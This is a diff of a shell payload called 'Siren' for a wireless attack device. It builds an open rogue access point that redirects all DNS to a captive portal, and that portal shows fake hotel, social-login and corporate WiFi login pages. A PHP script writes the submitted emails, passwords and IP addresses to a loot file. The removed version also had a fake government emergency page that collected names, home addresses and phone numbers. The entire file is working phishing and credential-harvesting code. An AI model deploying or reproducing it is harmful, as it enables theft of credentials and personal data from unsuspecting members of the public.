@@ -1,31 +1,28 @@
-#!/bin/sh
-#═══════════════════════════════════════════════════════════════════════════════
-# SIREN - Social Infrastructure Reconnaissance & Enticement Network
-# Developed by: bad-antics
-# 
-# Advanced captive portal with multiple lures - Hotel, Airport, Coffee, Social
-#═══════════════════════════════════════════════════════════════════════════════
+#!/bin/bash
+# Title: Siren - Social Infrastructure Reconnaissance
+# Author: bad-antics
+# Description: Advanced captive portal with multiple lures
+# Category: nullsec/attack
 
 LOOT_DIR="/mmc/nullsec/siren"
-PORTAL_DIR="/mmc/nullsec/portals"
-mkdir -p "$LOOT_DIR" "$PORTAL_DIR/siren"
+PORTAL_DIR="/tmp/siren_portal"
+mkdir -p "$LOOT_DIR" "$PORTAL_DIR"
 
-PROMPT "    ╔═╗╦╦═╗╔═╗╔╗╔
-    ╚═╗║╠╦╝║╣ ║║║
-    ╚═╝╩╩╚═╚═╝╝╚╝
-━━━━━━━━━━━━━━━━━━━━━━━━━
-The Wireless Lure
+PROMPT "SIREN - THE WIRELESS LURE
 
-Sing them to their doom
-with irresistible
-network names.
+Advanced captive portal with
+themed login pages.
 
-They will connect.
-They will submit.
-━━━━━━━━━━━━━━━━━━━━━━━━━
-Developed by: bad-antics"
+Songs:
+1. Hotel WiFi
+2. Airport Free
+3. Coffee Shop
+4. Social Login
+5. Corporate Guest
 
-PROMPT "SIREN SONGS:
+Press OK to configure."
+
+PROMPT "CHOOSE YOUR SONG:
 
 1. Hotel WiFi
 2. Airport Free
@@ -33,12 +30,12 @@ PROMPT "SIREN SONGS:
 4. Social Login
 5. Corporate Guest
 6. Free Premium WiFi
-7. Government Alert
-8. WiFi Survey (Prize)"
 
-SONG=$(NUMBER_PICKER "Choose song (1-8):" 1)
+Select on next screen."
 
-# Set SSID and portal based on selection
+SONG=$(NUMBER_PICKER "Song (1-6):" 1)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SONG=1 ;; esac
+
 case $SONG in
     1) SSID="Marriott_Guest_WiFi"; PORTAL_TYPE="hotel" ;;
     2) SSID="Airport_Free_WiFi"; PORTAL_TYPE="airport" ;;
@@ -46,217 +43,136 @@ case $SONG in
     4) SSID="Free_WiFi_Social"; PORTAL_TYPE="social" ;;
     5) SSID="GUEST-NETWORK"; PORTAL_TYPE="corporate" ;;
     6) SSID="FREE_PREMIUM_WIFI"; PORTAL_TYPE="premium" ;;
-    7) SSID="EMERGENCY_ALERT"; PORTAL_TYPE="government" ;;
-    8) SSID="WiFi_Survey_WIN"; PORTAL_TYPE="survey" ;;
 esac
 
-CUSTOM_SSID=$(TEXT_PICKER "SSID (or use default):" "$SSID")
+CUSTOM_SSID=$(TEXT_PICKER "SSID (or keep default):" "$SSID")
 [ -n "$CUSTOM_SSID" ] && SSID="$CUSTOM_SSID"
 
-CONFIRMATION_DIALOG "DEPLOY SIREN:
+DURATION=$(NUMBER_PICKER "Duration (minutes):" 30)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac
+DURATION_SEC=$((DURATION * 60))
+
+resp=$(CONFIRMATION_DIALOG "DEPLOY SIREN?
+
 SSID: $SSID
 Portal: $PORTAL_TYPE
+Duration: ${DURATION} min
 
-Victims will be lured
-to submit credentials.
+Press OK to deploy.")
+[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
-Deploy?"
-[ $? -ne 0 ] && exit 0
+LOOT_FILE="$LOOT_DIR/siren_$(date +%Y%m%d_%H%M).txt"
+echo "SIREN Credentials - $(date) - SSID: $SSID" > "$LOOT_FILE"
 
-INTERFACE="wlan0"
-LOOT_FILE="$LOOT_DIR/siren_$(date +%Y%m%d_%H%M%S).txt"
-
-# Generate portal HTML
-create_portal() {
-    local TYPE="$1"
-    local HTML="$PORTAL_DIR/siren/index.html"
-    
-    case $TYPE in
-        hotel)
-            cat > "$HTML" << 'HOTEL_HTML'
-<!DOCTYPE html>
-<html><head><title>Hotel Guest WiFi</title>
-<style>body{font-family:Arial;background:#1a1a2e;color:#fff;margin:0;padding:20px}
-.container{max-width:400px;margin:0 auto;background:#16213e;padding:30px;border-radius:10px}
-h1{color:#e94560;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px}
-button{width:100%;padding:15px;background:#e94560;color:#fff;border:none;border-radius:5px;cursor:pointer}</style>
-</head><body><div class="container"><h1>🏨 Hotel Guest WiFi</h1>
-<p>Please enter your room details to connect</p>
-<form action="/capture" method="POST">
+# Create portal based on type
+case $PORTAL_TYPE in
+    hotel)
+        cat > "$PORTAL_DIR/index.html" << 'PHTML'
+<!DOCTYPE html><html><head><title>Hotel Guest WiFi</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font-family:Arial;background:#1a1a2e;color:#fff;margin:0;padding:20px}.c{max-width:400px;margin:0 auto;background:#16213e;padding:30px;border-radius:10px}h1{color:#e94560;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px;box-sizing:border-box}button{width:100%;padding:15px;background:#e94560;color:#fff;border:none;border-radius:5px}</style>
+</head><body><div class="c"><h1>Hotel Guest WiFi</h1>
+<p>Enter room details to connect</p>
+<form action="/capture.php" method="POST">
 <input name="room" placeholder="Room Number" required>
 <input name="lastname" placeholder="Last Name" required>
-<input name="email" type="email" placeholder="Email Address" required>
-<button type="submit">Connect to WiFi</button>
-</form></div></body></html>
-HOTEL_HTML
-            ;;
-        social)
-            cat > "$HTML" << 'SOCIAL_HTML'
-<!DOCTYPE html>
-<html><head><title>Free WiFi - Login</title>
-<style>body{font-family:Arial;background:#0f0f0f;color:#fff;margin:0;padding:20px}
-.container{max-width:400px;margin:0 auto;background:#1a1a1a;padding:30px;border-radius:10px}
-.btn{width:100%;padding:15px;margin:5px 0;border:none;border-radius:5px;cursor:pointer;font-size:16px}
-.fb{background:#1877f2;color:#fff}.google{background:#fff;color:#333}.twitter{background:#1da1f2;color:#fff}</style>
-</head><body><div class="container"><h1>🌐 Free WiFi Access</h1>
-<p>Sign in with your social account</p>
-<form action="/capture" method="POST">
-<input name="email" type="email" placeholder="Email" style="width:100%;padding:12px;margin:10px 0">
-<input name="password" type="password" placeholder="Password" style="width:100%;padding:12px;margin:10px 0">
-<button class="btn fb">Continue with Facebook</button>
-<button class="btn google">Continue with Google</button>
-<button class="btn twitter">Continue with Twitter</button>
-</form></div></body></html>
-SOCIAL_HTML
-            ;;
-        government)
-            cat > "$HTML" << 'GOV_HTML'
-<!DOCTYPE html>
-<html><head><title>⚠️ Emergency Alert System</title>
-<style>body{font-family:Arial;background:#8B0000;color:#fff;margin:0;padding:20px}
-.container{max-width:500px;margin:0 auto;background:#000;padding:30px;border:3px solid #ff0;border-radius:10px}
-h1{color:#ff0;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px}
-button{width:100%;padding:15px;background:#ff0;color:#000;border:none;border-radius:5px;cursor:pointer;font-weight:bold}</style>
-</head><body><div class="container"><h1>⚠️ EMERGENCY ALERT ⚠️</h1>
-<p style="color:#ff0">MANDATORY REGISTRATION REQUIRED</p>
-<p>Due to recent security concerns, all devices must be registered.</p>
-<form action="/capture" method="POST">
-<input name="fullname" placeholder="Full Legal Name" required>
-<input name="phone" placeholder="Phone Number" required>
-<input name="email" type="email" placeholder="Email Address" required>
-<input name="address" placeholder="Home Address" required>
-<button type="submit">REGISTER DEVICE</button>
-</form></div></body></html>
-GOV_HTML
-            ;;
-        *)
-            cat > "$HTML" << 'DEFAULT_HTML'
-<!DOCTYPE html>
-<html><head><title>Free WiFi</title>
-<style>body{font-family:Arial;background:#121212;color:#fff;margin:0;padding:20px}
-.container{max-width:400px;margin:0 auto;background:#1e1e1e;padding:30px;border-radius:10px}
-h1{text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px}
-button{width:100%;padding:15px;background:#4CAF50;color:#fff;border:none;border-radius:5px;cursor:pointer}</style>
-</head><body><div class="container"><h1>📶 Free WiFi Access</h1>
-<form action="/capture" method="POST">
-<input name="email" type="email" placeholder="Email Address" required>
-<input name="password" type="password" placeholder="Create Password" required>
-<button type="submit">Get Free Access</button>
-</form></div></body></html>
-DEFAULT_HTML
-            ;;
-    esac
-}
+<input name="email" type="email" placeholder="Email" required>
+<button type="submit">Connect</button></form></div></body></html>
+PHTML
+        ;;
+    social)
+        cat > "$PORTAL_DIR/index.html" << 'PHTML'
+<!DOCTYPE html><html><head><title>Free WiFi - Login</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font-family:Arial;background:#0f0f0f;color:#fff;margin:0;padding:20px}.c{max-width:400px;margin:0 auto;background:#1a1a1a;padding:30px;border-radius:10px}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px;box-sizing:border-box}button{width:100%;padding:15px;margin:5px 0;border:none;border-radius:5px;font-size:16px}.fb{background:#1877f2;color:#fff}</style>
+</head><body><div class="c"><h1>Free WiFi</h1><p>Sign in to connect</p>
+<form action="/capture.php" method="POST">
+<input name="email" type="email" placeholder="Email" required>
+<input name="password" type="password" placeholder="Password" required>
+<button class="fb" type="submit">Sign In</button></form></div></body></html>
+PHTML
+        ;;
+    *)
+        cat > "$PORTAL_DIR/index.html" << 'PHTML'
+<!DOCTYPE html><html><head><title>Free WiFi</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font-family:Arial;background:#121212;color:#fff;margin:0;padding:20px}.c{max-width:400px;margin:0 auto;background:#1e1e1e;padding:30px;border-radius:10px}h1{text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px;box-sizing:border-box}button{width:100%;padding:15px;background:#4CAF50;color:#fff;border:none;border-radius:5px}</style>
+</head><body><div class="c"><h1>Free WiFi Access</h1>
+<form action="/capture.php" method="POST">
+<input name="email" type="email" placeholder="Email" required>
+<input name="password" type="password" placeholder="Password" required>
+<button type="submit">Connect</button></form></div></body></html>
+PHTML
+        ;;
+esac
 
-# Create credential capture script
-cat > "$PORTAL_DIR/siren/capture.sh" << CAPTURE
-#!/bin/bash
-# Log credentials
-echo "[$(date)] \$QUERY_STRING" >> "$LOOT_FILE"
-# Redirect to success
-echo "HTTP/1.1 302 Found"
-echo "Location: http://success.html"
-echo ""
-CAPTURE
-chmod +x "$PORTAL_DIR/siren/capture.sh"
+# PHP capture script (properly reads POST data)
+cat > "$PORTAL_DIR/capture.php" << CAPEOF
+<?php
+\$log = "$LOOT_FILE";
+\$ts = date("Y-m-d H:i:s");
+\$ip = \$_SERVER['REMOTE_ADDR'];
+\$data = "";
+foreach (\$_POST as \$k => \$v) { \$data .= "\$k=\$v "; }
+file_put_contents(\$log, "[\$ts] IP:\$ip \$data\n", FILE_APPEND);
+header("Location: /success.html");
+?>
+CAPEOF
 
-# Success page
-cat > "$PORTAL_DIR/siren/success.html" << 'SUCCESS'
-<!DOCTYPE html>
-<html><head><title>Connected!</title>
-<style>body{font-family:Arial;background:#1a1a1a;color:#fff;text-align:center;padding:50px}
-h1{color:#4CAF50}p{font-size:18px}</style>
-</head><body><h1>✓ Connected!</h1>
-<p>You now have internet access.</p>
-<p>Redirecting...</p>
-<script>setTimeout(()=>window.location='http://www.google.com',3000)</script>
-</body></html>
-SUCCESS
+cat > "$PORTAL_DIR/success.html" << 'SHTML'
+<!DOCTYPE html><html><head><title>Connected!</title>
+<style>body{font-family:Arial;background:#1a1a1a;color:#fff;text-align:center;padding:50px}h1{color:#4CAF50}</style>
+</head><body><h1>✓ Connected!</h1><p>You now have internet access.</p></body></html>
+SHTML
 
-create_portal "$PORTAL_TYPE"
+LOG "Deploying Siren..."
 
-cat > "$LOOT_FILE" << EOF
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- SIREN - Credential Harvest Log
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- SSID: $SSID
- Portal: $PORTAL_TYPE
- Started: $(date)
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- NullSec Pineapple Suite | Developed by: bad-antics
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-CAPTURED CREDENTIALS:
-EOF
-
-LOG "Siren singing..."
-SPINNER_START "Luring victims to $SSID..."
-
-# Start AP
-pkill hostapd dnsmasq 2>/dev/null
+killall hostapd dnsmasq php 2>/dev/null
+AP_IF="wlan1"
+airmon-ng stop wlan1mon 2>/dev/null
 sleep 1
 
-cat > /tmp/siren_hostapd.conf << HOSTAPD
-interface=$INTERFACE
+cat > /tmp/siren_hostapd.conf << EOF
+interface=$AP_IF
 driver=nl80211
 ssid=$SSID
 channel=6
 hw_mode=g
-HOSTAPD
-
-cat > /tmp/siren_dnsmasq.conf << DNSMASQ
-interface=$INTERFACE
-dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,12h
-address=/#/192.168.4.1
-DNSMASQ
-
-ifconfig $INTERFACE 192.168.4.1 netmask 255.255.255.0 up
-hostapd /tmp/siren_hostapd.conf -B 2>/dev/null
-dnsmasq -C /tmp/siren_dnsmasq.conf 2>/dev/null
-
-# Start web server (simple Python if available)
-cd "$PORTAL_DIR/siren"
-python3 -m http.server 80 2>/dev/null &
-WEB_PID=$!
-
-# Wait for user to stop
-PROMPT "SIREN ACTIVE
-━━━━━━━━━━━━━━━━━━━━━━━━━
-Broadcasting: $SSID
-
-Portal: $PORTAL_TYPE
-Listening for victims...
-
-Press OK to stop
-and view captures.
-━━━━━━━━━━━━━━━━━━━━━━━━━
-Developed by: bad-antics"
-
-SPINNER_STOP
-
-# Cleanup
-pkill hostapd dnsmasq 2>/dev/null
-kill $WEB_PID 2>/dev/null
-
-CAPTURES=$(grep -c "^\[" "$LOOT_FILE" 2>/dev/null || echo 0)
-
-cat >> "$LOOT_FILE" << EOF
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- SIREN STOPPED
- Total Captures: $CAPTURES
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- NullSec Pineapple Suite | Developed by: bad-antics
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+auth_algs=1
+wpa=0
 EOF
 
+hostapd /tmp/siren_hostapd.conf -B 2>/dev/null
+sleep 2
+ifconfig $AP_IF 192.168.4.1 netmask 255.255.255.0 up
+
+cat > /tmp/siren_dnsmasq.conf << EOF
+interface=$AP_IF
+bind-interfaces
+dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,12h
+address=/#/192.168.4.1
+EOF
+dnsmasq -C /tmp/siren_dnsmasq.conf 2>/dev/null
+
+cd "$PORTAL_DIR"
+php -S 192.168.4.1:80 2>/dev/null &
+
+LOG "Siren active: $SSID ($PORTAL_TYPE)"
+
+sleep "$DURATION_SEC"
+
+killall hostapd dnsmasq php 2>/dev/null
+rm -rf "$PORTAL_DIR" /tmp/siren_*.conf
+airmon-ng start wlan1 2>/dev/null
+
+CAPTURES=$(grep -c "IP:" "$LOOT_FILE" 2>/dev/null || echo 0)
+
 PROMPT "SIREN SILENCED
-━━━━━━━━━━━━━━━━━━━━━━━━━
-The song ends.
 
 SSID: $SSID
+Portal: $PORTAL_TYPE
+Duration: ${DURATION} min
 Captures: $CAPTURES
-
 Log: $LOOT_FILE
-━━━━━━━━━━━━━━━━━━━━━━━━━
-Developed by: bad-antics"
+
+Press OK to exit."
